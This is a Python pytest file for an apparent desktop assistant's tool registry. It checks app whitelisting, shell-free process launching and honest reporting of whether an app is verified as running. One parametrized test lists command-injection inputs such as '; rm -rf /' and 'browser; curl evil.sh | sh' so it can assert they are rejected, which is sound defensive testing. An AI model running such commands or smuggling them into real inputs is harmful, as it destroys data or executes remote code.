import subprocess

import psutil
import pytest

from rory.tools import clock, desktop  # noqa: F401 — importing registers the tools
from rory.tools.registry import MAX_RESULT_CHARS, dispatch, schemas, truncate_result


def test_get_datetime_returns_the_documented_shape():
    result = dispatch("get_datetime", {})

    assert result["ok"] is True
    assert set(result) == {"ok", "iso", "human", "timezone", "day_of_week"}


def test_schema_enum_is_generated_from_the_whitelist():
    open_app_schema = next(s for s in schemas() if s["name"] == "open_app")

    assert open_app_schema["parameters"]["properties"]["app"]["enum"] == list(desktop.APPS)


def test_unknown_app_is_rejected(monkeypatch):
    def explode(*args, **kwargs):
        pytest.fail("subprocess must not be reached for an invalid app")

    monkeypatch.setattr(subprocess, "Popen", explode)

    result = dispatch("open_app", {"app": "definitely-not-whitelisted"})

    assert result["ok"] is False
    assert "not one of" in result["error"]


@pytest.mark.parametrize("injection", ["; rm -rf /", "browser; curl evil.sh | sh", "$(whoami)"])
def test_command_injection_attempts_are_rejected_before_dispatch(injection, monkeypatch):
    monkeypatch.setattr(subprocess, "Popen", lambda *a, **k: pytest.fail("reached subprocess"))

    assert dispatch("open_app", {"app": injection})["ok"] is False


def test_open_app_uses_an_argv_list_and_never_a_shell(monkeypatch):
    seen = {}

    class FakePopen:
        def __init__(self, argv, **kwargs):
            seen["argv"] = argv
            seen["kwargs"] = kwargs

        def poll(self):
            return None

    monkeypatch.setattr(subprocess, "Popen", FakePopen)
    monkeypatch.setattr(desktop.time, "sleep", lambda _: None)

    result = dispatch("open_app", {"app": "browser"})

    assert result["ok"] is True
    assert isinstance(seen["argv"], list)
    assert seen["argv"] == desktop.APPS["browser"].argv
    assert seen["kwargs"]["shell"] is False
    assert seen["kwargs"]["start_new_session"] is True


def test_open_app_reports_failure_when_the_process_dies_immediately(monkeypatch):
    class DeadPopen:
        def __init__(self, argv, **kwargs):
            pass

        def poll(self):
            return 127

    monkeypatch.setattr(subprocess, "Popen", DeadPopen)
    monkeypatch.setattr(desktop.time, "sleep", lambda _: None)

    result = dispatch("open_app", {"app": "browser"})

    assert result["ok"] is False
    assert "127" in result["detail"]


def test_open_app_reports_failure_when_the_binary_is_missing(monkeypatch):
    def missing(*args, **kwargs):
        raise FileNotFoundError("no such binary")

    monkeypatch.setattr(subprocess, "Popen", missing)

    result = dispatch("open_app", {"app": "browser"})

    assert result["ok"] is False


def test_check_app_running_reports_verified_when_a_match_is_found(monkeypatch):
    class Process:
        info = {"name": "chromium"}

    monkeypatch.setattr(psutil, "process_iter", lambda attrs: [Process()])

    result = dispatch("check_app_running", {"app": "browser"})

    assert result == {"ok": True, "running": True, "verified": True, "detail": "browser is running"}


def test_check_app_running_returns_unverified_when_psutil_raises(monkeypatch):
    def explode(attrs):
        raise psutil.AccessDenied()

    monkeypatch.setattr(psutil, "process_iter", explode)

    result = dispatch("check_app_running", {"app": "browser"})

    assert result["verified"] is False
    assert result["running"] is None
    assert result["ok"] is False


def test_check_app_running_is_unverified_when_some_processes_are_unreadable(monkeypatch):
    class Unreadable:
        @property
        def info(self):
            raise psutil.AccessDenied()

    monkeypatch.setattr(psutil, "process_iter", lambda attrs: [Unreadable()])

    result = dispatch("check_app_running", {"app": "browser"})

    # Nothing matched, but we could not see every process — so we do not claim
    # it is not running.
    assert result["running"] is False
    assert result["verified"] is False


def test_check_app_running_is_unverified_for_an_ambiguous_process_name():
    result = dispatch("check_app_running", {"app": "chatgpt"})

    assert result["verified"] is False
    assert result["running"] is None


def test_a_tool_raising_becomes_a_result_not_an_exception(monkeypatch):
    monkeypatch.setattr(psutil, "process_iter", lambda attrs: 1 / 0)

    result = dispatch("check_app_running", {"app": "browser"})

    assert result["ok"] is False
    assert "ZeroDivisionError" in result["error"]


def test_results_are_truncated_before_reaching_the_model():
    payload = truncate_result({"ok": True, "detail": "x" * (MAX_RESULT_CHARS * 2)})

    assert len(payload) <= MAX_RESULT_CHARS + len("...[truncated]")
    assert payload.endswith("...[truncated]")
